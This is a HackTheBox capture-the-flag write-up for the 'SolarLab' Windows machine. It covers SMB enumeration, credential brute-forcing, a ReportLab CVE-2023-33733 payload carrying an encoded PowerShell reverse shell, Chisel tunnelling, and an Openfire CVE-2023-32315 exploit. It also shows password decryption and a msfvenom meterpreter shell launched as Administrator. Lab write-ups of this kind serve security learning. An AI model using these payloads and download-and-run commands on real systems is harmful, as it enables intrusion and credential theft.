---
title: "SolarLab Writeup - HackTheBox"
date: 2024-09-24
draft: false
Tags:
- HackTheBox
- Windows
- Medium
---

| Link: | [https://app.hackthebox.com/machines/SolarLab](https://app.hackthebox.com/machines/SolarLab) |
| --- | --- |
| Difficulty | Medium |
| Machine | Windows |

---

## Enumeration

**Nmap**

I ran **`nmap 10.10.11.16 -vv -p- -T4`** first to see all available ports on this box. I checked port 80 (the verbose flag showed us that port 80 was already open) while I waited for the scan to complete. I visited the site after adding **`10.10.11.16 solarlab.htb`** to the **`/etc/hosts`** file. This is what the website looks like.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled.png)

As the nmap finished scanning all ports, here are the open ports on this box:

```
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack
135/tcp  open  msrpc        syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
6791/tcp open  hnm          syn-ack
```

I will perform an aggressive scan on these ports using the command: **`nmap 10.10.11.16 -vv -p80,135,139,445,6791 -T4 -A`**.

```
PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack nginx 1.24.0
|_http-title: SolarLab Instant Messenger
|_http-server-header: nginx/1.24.0
| http-methods: 
|_  Supported Methods: GET HEAD
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack
6791/tcp open  http          syn-ack nginx 1.24.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
```

I attempted to use the 'send contact' feature to test if we could inject XSS from here, but it initially utilized a GET request. Changing it to a POST request didn’t enable us to perform any actions.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%201.png)

As Nmap suggested that the supported methods were GET and HEAD, I used a HEAD request, which actually worked as intended.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%202.png)

## User Flag

Nothing seems to be working here, including XSS, SQLi, etc. For now, I will explore another port. I ran **`smbclient //10.10.11.16/Documents -U Guest`**, which actually worked and logged me in.

```
┌──(root㉿kali)-[/HTB/SolarLab]
└─# smbclient //10.10.11.16/Documents -U Guest
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Apr 26 10:47:14 2024
  ..                                 DR        0  Fri Apr 26 10:47:14 2024
  concepts                            D        0  Fri Apr 26 10:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 05:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 07:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 14:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 14:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 14:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023

                7779839 blocks of size 4096. 1800663 blocks available
smb: \> get details-file.xlsx
getting file \details-file.xlsx of size 12793 as details-file.xlsx (35.2 KiloBytes/sec) (average 35.2 KiloBytes/sec)
smb: \> gvet old_leave_request_form.docx
gvet: command not found
smb: \> get old_leave_request_form.docx
getting file \old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (45.7 KiloBytes/sec) (average 42.4 KiloBytes/sec)
smb: \> cd concepts
smb: \concepts\> ls
  .                                   D        0  Fri Apr 26 10:41:57 2024
  ..                                  D        0  Fri Apr 26 10:41:57 2024
  Training-Request-Form.docx          A   161337  Fri Nov 17 05:46:57 2023
  Travel-Request-Sample.docx          A    30953  Fri Nov 17 05:36:54 2023

                7779839 blocks of size 4096. 1800276 blocks available

```

I retrieved all the important files to see if there was anything interesting among them.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%203.png)

Out of all the files, **`details-file.xlsx`** contained some useful information, such as passwords and emails. I took note of the usernames and passwords.

Next, I visited port 6791, which had an HTTP service running on it. It redirected me to the **`report.solarlab.htb`** subdomain, which has a login page for ReportHub.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%204.png)

"I tried brute-forcing the username and password fields using the credentials we found earlier with Burp Intruder. The following credentials worked: `BlakeB:ThisCanB3typedeasily1@`

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%205.png)

I did some research on ReportHub and found a CVE related to it: [CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733).

Here is the exploit code:

```
<p><font color="[ [ getattr(pow,Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANwA3ADkAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
exploit
</font></p>
```

I used this request in the **`travel_request`** parameter of the **`/travelApprovalForm`** endpoint."

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%206.png)

And I got the user flag 

```
PS C:\Users\blake\Desktop> cat user.txt
USERFLAG_REDACTED_HTB
```

## Root Flag

I sent **`winPEAS.exe`** to the Windows box using the following command:

**`Invoke-WebRequest "http://10.10.14.3/winPEASx86.exe" -OutFile "winpeasS.exe"`** (make sure the HTTP server is running).

Then I ran **`.\winpeasS.exe`** to execute it.

From the output, I discovered that there is another user named **`openfire`** (in addition to Blake, admin accounts, and service accounts) on this machine. Additionally, winPEAS revealed that Openfire is running on port 9090.

Next, I used Chisel to set up port forwarding.

I ran **`chisel server -p 8000 --reverse`** on my Kali machine.

Then, on the target machine, logged in as user Blake, I executed:

**`.\chisel.exe client 10.10.14.3:8000 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091`** (I transferred the Chisel executable to the target machine using **`Invoke-WebRequest "http://10.10.14.3/chisel.exe" -OutFile "chisel.exe"`** before running it).

After port forwarding with Chisel, I accessed **`localhost:9090`** and found an Openfire 4.7.4 admin console. This version has a known CVE, and an exploit is available in Metasploit.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%207.png)

Here's the exploit I used for Openfire 4.7.4

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%208.png)

I used `exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315` to exploit the openfire.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%209.png)

Although it didn’t create a session for us, it did create an admin user, which allowed us to log in to the application.

I downloaded **`openfire-management-tool-plugin.jar`** from [this GitHub repository](https://github.com/miko550/CVE-2023-32315).

Then, I uploaded it in the Plugins tab. To do this, I changed the **`uploadsuccess=false`** to **`true`** in order to successfully upload our plugin. By default, the **`uploadsuccess`** parameter is set to **`false`**, which prevents the upload. I changed it to **`true`** to successfully upload the plugin.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%2010.png)

After uploading the plugin, navigate to Server > Server Settings > Management Tool. Set the password as '123', then select 'System Command'.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%2011.png)

We found a shell execution point. I decided to execute a payload similar to the one used previously. I generated the payload from the same website I used before. Then, I launched **`nc`** and started listening on port 6565 to receive the reverse shell. Finally, I executed the PowerShell reverse shell payload from the website.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%2012.png)

After executing the command, I gained shell access for the user **`solarlab\openfire`**.

I discovered interesting credentials within the **`openfire.script`** file located at the **`PS C:\Program Files\Openfire\embedded-db\`** directory.

```
// NOTE: ONLY IMPORTANT DETAILS EXTRACTED FRROM THE SCRIPT IS SHOWN BELOW
CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'

INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
```

I received an encrypted password and a passkey. To decrypt the password, I used them together with [https://github.com/c0rdis/openfire_decrypt](https://github.com/c0rdis/openfire_decrypt). Following the instructions, I compiled the JAR file:

```bash
javac OpenFireDecryptPass.java
```

This command compiled the JAR file. To crack the hash, I executed:

```bash
java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
```

In this command, the first argument is the encrypted password, and the second one is the passkey. Through this process, I successfully cracked the hashes, revealing the credentials:

**`Administrator:ThisPasswordShouldDo!@`**

Now, I am armed with these credentials.

I installed sudo **`wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip`** on my Kali machine and then transferred the .exe file inside the zip to my target machine using **`Invoke-WebRequest "http://10.10.14.3:8888/RunasCs.exe" -OutFile "runascs.exe"`**. After that, I created a payload with msfvenom: **`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9898 -f exe -o shell.exe`** and then sent the shell.exe file to the target machine using: **`Invoke-WebRequest "http://10.10.14.3/shell.exe" -OutFile "shell.exe"`**.

![Untitled](SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%2013.png)

Now that I have both of the .exe files on my target machine, I will use the multi/handler in Metasploit to capture the shell.

To set up the multi/handler, I ran these commands sequentially:

- **`msfconsole`**
- **`use multi/handler`**
- **`set payload windows/x64/meterpreter/reverse_tcp`**
- **`set lhost tun0`**
- **`set lport 9898`**
- **`run`**

After that, I went to my target machine and executed the command:
**`.\runascs.exe Administrator ThisPasswordShouldDo!@ shell.exe`**

Upon running the above code, I observed that the meterpreter shell popped up, and I gained administrator access. 🙂

We rooted this box! Yay!

## Conclusion

Thanks for following my writeup on this box. I hope you learned something new from my methodology.
